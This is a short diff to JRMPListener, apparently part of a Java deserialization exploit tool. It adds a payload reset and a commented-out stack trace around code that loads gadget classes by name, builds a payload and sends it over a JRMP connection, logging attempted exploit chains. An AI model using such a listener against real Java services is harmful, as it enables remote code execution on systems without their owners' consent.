@@ -265,6 +265,7 @@ public class JRMPListener implements Runnable {
         //---------------------------------------
         try {
             Class<?> aClass = Class.forName("org.gadget." + object);
+            payload = null;
             Object o = aClass.getConstructor().newInstance();
             Method getObject = Class.forName("org.gadget.inter.Gadget").getMethod("getObject", String.class);
             getObject.setAccessible(true);
@@ -272,6 +273,7 @@ public class JRMPListener implements Runnable {
             payload = invoke;
             System.out.println("尝试利用链："+object);
         }catch (Exception e){
+//            e.printStackTrace();
         }
 
         out.writeByte(TransportConstants.Return);// transport op
@@ -293,6 +295,8 @@ public class JRMPListener implements Runnable {
 
         oos.flush();
         out.flush();
+
+
 
         this.hadConnection = true;
         synchronized (this.waitLock) {
